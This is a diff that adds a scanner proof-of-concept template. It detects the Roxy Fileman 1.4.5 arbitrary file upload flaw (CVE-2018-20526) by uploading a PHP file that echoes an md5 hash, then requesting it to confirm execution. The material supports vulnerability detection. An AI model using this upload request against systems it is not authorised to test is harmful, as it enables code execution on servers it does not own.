@@ -1,0 +1,67 @@
+[info]
+author = "AVE"
+description = "通过 POST 请求向 /php/upload.php 上传 PHP 文件，然后访问上传的文件验证是否成功执行，检测 Roxy Fileman 1.4.5 任意文件上传漏洞"
+id = "POC-AVE-2018-0165"
+name = "Roxy Fileman 1.4.5 任意文件上传 PoC"
+severity = "critical"
+tags = ["ave-2018-0165"]
+vuln_id = [
+    "CVE-2018-20526",
+    "AVE-2018-0165",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/php/upload.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary20kgW2hEKYaeF5iP\r
+Content-Disposition: form-data; name="action"\r
+\r
+upload\r
+------WebKitFormBoundary20kgW2hEKYaeF5iP\r
+Content-Disposition: form-data; name="method"\r
+\r
+ajax\r
+------WebKitFormBoundary20kgW2hEKYaeF5iP\r
+Content-Disposition: form-data; name="d"\r
+\r
+/Uploads\r
+------WebKitFormBoundary20kgW2hEKYaeF5iP\r
+Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.php7"\r
+Content-Type: application/octet-stream\r
+\r
+<?php
+echo md5('CVE-2018-20526');
+?>\r
+------WebKitFormBoundary20kgW2hEKYaeF5iP--"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/Uploads/{{randstr}}.php7"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["f76d6a5f7491700cc3a678bdba2902d3"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
